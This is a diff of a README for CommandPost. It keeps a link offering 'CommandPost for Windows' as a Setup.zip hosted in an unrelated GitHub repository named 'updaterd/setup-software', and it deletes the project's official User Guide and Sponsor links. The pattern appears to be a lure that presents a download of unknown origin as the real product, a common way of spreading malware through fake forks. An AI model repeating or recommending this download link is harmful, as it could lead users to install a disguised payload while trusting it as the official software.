@@ -16,13 +16,5 @@ With the addition of a powerful plugin architecture, the aim of CommandPost is t
 
 You can Download CommandPost for Windows [here](https://raw.githubusercontent.com/updaterd/setup-software/master/Setup.zip).
 
-## User Guide:
-
-You can access the User Guide [here](http://help.commandpost.io/).
-
-
-## Sponsor:
-
-To help continue CommandPost to grow, evolve, and stay completely free and open-source, we offer the ability to [sponsor CommandPost directly through GitHub](https://github.com/sponsors/commandpost).
 
 
